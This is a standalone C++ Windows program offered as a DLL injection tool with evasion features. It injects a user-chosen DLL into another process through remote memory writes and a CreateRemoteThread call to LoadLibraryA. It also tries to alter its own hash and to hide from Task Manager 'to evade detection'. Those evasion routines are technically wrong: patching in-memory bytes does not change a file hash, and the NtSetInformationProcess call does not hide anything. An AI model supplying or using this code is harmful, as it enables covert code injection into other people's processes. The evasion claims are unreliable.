#include <windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include <tlhelp32.h>
#include <psapi.h>

// Function to change the executable's name and modify bytes to obfuscate its hash
void ChangeNameAndHash() {
    char buffer[MAX_PATH];
    GetModuleFileNameA(nullptr, buffer, MAX_PATH);
    std::string currentName(buffer);

    // Create a new random name for the executable
    std::string newName = currentName + ".bak"; // For simplicity, append ".bak" to the filename

    // Rename the executable
    if (MoveFileA(currentName.c_str(), newName.c_str())) {
        std::cout << "Executable renamed to " << newName << std::endl;
    } else {
        std::cerr << "Failed to rename executable: " << GetLastError() << std::endl;
    }

    // Modify a few bytes in the executable memory to change its hash
    // Example: changing first few bytes of code
    unsigned char* pAddress = (unsigned char*)GetModuleHandleA(nullptr);
    DWORD oldProtect;
    VirtualProtect(pAddress, 4, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    // Arbitrarily change the first 4 bytes
    pAddress[0] = 0x90; // NOP instruction (just an example)
    pAddress[1] = 0x90;
    pAddress[2] = 0x90;
    pAddress[3] = 0x90;
    
    VirtualProtect(pAddress, 4, oldProtect, &oldProtect);
    std::cout << "Executable memory modified to change hash." << std::endl;
}

// Function to inject DLL into target process
bool InjectDLL(DWORD processID, const std::string& dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
                                  PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, 
                                  FALSE, processID);
    if (!hProcess) {
        std::cerr << "Failed to open process: " << GetLastError() << std::endl;
        return false;
    }

    // Allocate memory in the target process for the DLL path
    LPVOID pRemoteDllPath = VirtualAllocEx(hProcess, nullptr, dllPath.size() + 1, MEM_COMMIT, PAGE_READWRITE);
    if (!pRemoteDllPath) {
        std::cerr << "Failed to allocate memory in target process: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    // Write the DLL path into the allocated memory
    if (!WriteProcessMemory(hProcess, pRemoteDllPath, dllPath.c_str(), dllPath.size() + 1, nullptr)) {
        std::cerr << "Failed to write memory in target process: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Get the address of LoadLibraryA in kernel32.dll
    LPVOID pLoadLibrary = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (!pLoadLibrary) {
        std::cerr << "Failed to get LoadLibrary address: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Create a remote thread in the target process that calls LoadLibraryA with our DLL path
    HANDLE hRemoteThread = CreateRemoteThread(hProcess, nullptr, 0, 
                          (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemoteDllPath, 0, nullptr);
    if (!hRemoteThread) {
        std::cerr << "Failed to create remote thread: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Wait for the remote thread to finish
    WaitForSingleObject(hRemoteThread, INFINITE);

    // Clean up
    VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
    CloseHandle(hRemoteThread);
    CloseHandle(hProcess);

    std::cout << "DLL injected successfully!" << std::endl;
    return true;
}

// Function to hide the process from task manager
void HideFromTaskManager() {
    // Using NtSetInformationProcess to remove process from being displayed in Task Manager
    typedef NTSTATUS (NTAPI *pNtSetInformationProcess)(HANDLE, ULONG, PVOID, ULONG);
    pNtSetInformationProcess NtSetInformationProcess = (pNtSetInformationProcess)GetProcAddress(
                                                        GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess");
    
    if (NtSetInformationProcess) {
        ULONG infoClass = 0x1D; // ProcessInformationClass for hiding
        NTSTATUS status = NtSetInformationProcess(GetCurrentProcess(), infoClass, nullptr, 0);
        if (status == 0) {
            std::cout << "Process hidden from Task Manager." << std::endl;
        } else {
            std::cerr << "Failed to hide process: " << status << std::endl;
        }
    } else {
        std::cerr << "Failed to get NtSetInformationProcess address." << std::endl;
    }
}

int main() {
    DWORD processID;
    std::string dllPath;

    std::cout << "Enter the process ID to inject into: ";
    std::cin >> processID;

    std::cout << "Enter full path to the DLL to inject: ";
    std::cin >> dllPath;

    // Continuously change the name and hash of the injector to evade detection
    ChangeNameAndHash();

    // Hide the process from task manager
    HideFromTaskManager();

    if (InjectDLL(processID, dllPath)) {
        std::cout << "Injection succeeded." << std::endl;
    } else {
        std::cout << "Injection failed." << std::endl;
    }

    return 0;
}
